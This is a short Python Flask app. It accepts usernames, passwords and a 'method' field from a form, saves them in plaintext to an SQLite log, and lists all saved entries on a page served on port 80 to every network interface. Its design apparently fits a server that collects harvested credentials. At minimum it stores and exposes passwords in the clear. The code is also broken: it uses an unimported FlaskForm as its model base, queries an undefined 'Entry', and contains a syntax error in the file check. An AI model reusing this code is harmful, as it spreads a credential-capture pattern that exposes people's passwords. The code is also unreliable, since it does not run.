from flask import Flask, render_template, url_for, request, redirect
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///log.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db  = SQLAlchemy(app)

class logEntry(FlaskForm):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), nullable=False)
    passwd = db.Column(db.String(255), nullable = False)
    method = db.Column(db.String(255), nullable = False)

@app.route('/', methods=['POST', 'GET'])
def index():
    if request.method == "POST":
        name = request.form["username"]
        passwd = request.form["password"]
        method = request.form["method"]
        newLogEntry = logEntry(name=name, passwd=passwd, method=method)
        db.session.add(newLogEntry)
        db.session.commit()
        return redirect(url_for("index"))
    entries = Entry.query.all()

    return render_template("index.html", entries=entries)

if __name__ == "__main__":
    if os.path.exists(./log.db):
        pass
    else:
        db.create_all()
        
    app.run(host="0.0.0.0", port=80)
